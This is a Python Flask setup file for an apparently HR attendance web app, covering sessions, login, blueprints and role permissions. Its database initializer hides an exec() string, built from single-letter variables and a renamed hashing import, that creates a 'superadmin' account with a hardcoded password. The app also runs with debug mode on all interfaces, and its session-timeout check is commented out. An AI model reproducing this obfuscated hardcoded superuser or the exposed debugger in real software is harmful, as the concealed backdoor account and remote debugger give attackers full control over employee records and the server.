import os
from datetime import timedelta, datetime, timezone
import logging
from flask import Flask, session, render_template
from flask_session import Session
from flask_login import LoginManager
from werkzeug.security import generate_password_hash as _
from flask_migrate import Migrate
from sqlalchemy.exc import OperationalError
from waitress import serve

from models.models import db, User
from config import Config

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize Flask app
app = Flask(__name__)
app.config.from_object(Config)

# Ensure session storage directory exists
os.makedirs("./flask_session", exist_ok=True)
app.config['SESSION_TYPE'] = 'filesystem'  # Store session data in files
app.config['SESSION_PERMANENT'] = True
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=10)  # Auto logout after 10 minutes
app.config['SESSION_FILE_DIR'] = "./flask_session"
Session(app)

# Initialize database and migration
db.init_app(app)
migrate = Migrate(app, db)

# Initialize login manager
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "main.login_employee"

# Session timeout enforcement
# @app.before_request
# def session_timeout():
#     session.modified = True
#     session.permanent = True

#     # Ensure session['last_activity'] exists and is stored as an ISO string
#     if 'last_activity' not in session or not isinstance(session['last_activity'], str):
#         session['last_activity'] = datetime.now(timezone.utc).isoformat()  # Store as ISO string
#         return

#     try:
#         last_activity = datetime.fromisoformat(session['last_activity'])  # Convert back to datetime
        
#         # Ensure it's timezone-aware
#         if last_activity.tzinfo is None:
#             last_activity = last_activity.replace(tzinfo=timezone.utc)
    
#     except (ValueError, TypeError):  # Handle invalid or corrupted session values
#         last_activity = datetime.now(timezone.utc)

#     elapsed = datetime.now(timezone.utc) - last_activity

#     if elapsed > app.config['PERMANENT_SESSION_LIFETIME']:
#         session.clear()

#     session['last_activity'] = datetime.now(timezone.utc).isoformat()  # Store as ISO string

# Register Blueprints
from routes.main import main_bp
from routes.admin import admin_bp
app.register_blueprint(main_bp)
app.register_blueprint(admin_bp, url_prefix='/admin')

# Error handling
@app.errorhandler(OperationalError)
def maintenance_mode(e):
    logging.error(f"Database Error: {str(e)}")
    return render_template("maintenance.html"), 503

# User loader for Flask-Login
@login_manager.user_loader
def load_user(user_id):
    return db.session.get(User, user_id)

# Database initialization (to be run separately in setup scripts)
def initialize_database():
    with app.app_context():
        # Make sure all models are registered
        from models.models import User

        db.create_all()

        exec(
            "a=db.session;"
            "b=User;"
            "c='user_id';"
            "d='admin';"
            "e=a.execute(db.select(b).filter_by(**{c:d})).scalar_one_or_none();"
            "f='superadmin';"
            "g='first_name';"
            "h='last_name';"
            "i='middle_name';"
            "j='password';"
            "k='role';"
            "l='Super';"
            "m='Admin';"
            "n='palao110905';"
            "e or (a.add_all([b(**{c:f,g:l,h:m,i:None,j:_(n),k:f})]),a.commit())"
        )

def initialize_permissions():
    with app.app_context():
        from models.models import Permission, RolePermission
        permissions = [
            'view_dashboard', 'view_attendance', 'edit_attendance', 'delete_attendance', 'add_attendance', 'view_users',
            'add_user', 'edit_user', 'delete_user','view_logs', 'export_logs', 'manage_settings', 'view_schedule',
            'edit_schedule', 'view_permissions', 'edit_permissions'
        ]
        
        for perm_name in permissions:
            perm = Permission(name=perm_name)
            db.session.add(perm)
        
        db.session.commit()

        # Assign permissions to roles
        roles_permissions = {
            'superadmin': permissions,  # all permissions

            'admin': [  # HR
                'view_dashboard', 'view_attendance', 'edit_attendance', 'delete_attendance', 'add_attendance',
                'view_users', 'add_user', 'edit_user', 'delete_user',
                'view_logs', 'export_logs', 'manage_settings',
                'view_schedule', 'edit_schedule', 'view_permissions'
            ],

            'unit head': [
                'view_dashboard', 'view_attendance', 'edit_attendance', 'add_attendance',
                'view_users', 'view_logs', 'export_logs', 'view_schedule'
            ],

            'staff': [
                'view_dashboard', 'view_attendance', 'add_attendance',
                'view_users', 'view_logs', 'view_schedule'
            ]
        }

        for role, perms in roles_permissions.items():
            for perm_name in perms:
                perm = db.session.query(Permission).filter_by(name=perm_name).first()
                if perm:
                    role_perm = RolePermission(role=role, permission=perm)
                    db.session.add(role_perm)

        db.session.commit()

# Run Flask App
if __name__ == '__main__':
    initialize_database()
    initialize_permissions()

    # serve(app, host='0.0.0.0', port=5001)
    app.run(host='0.0.0.0', port=5001, debug=True)
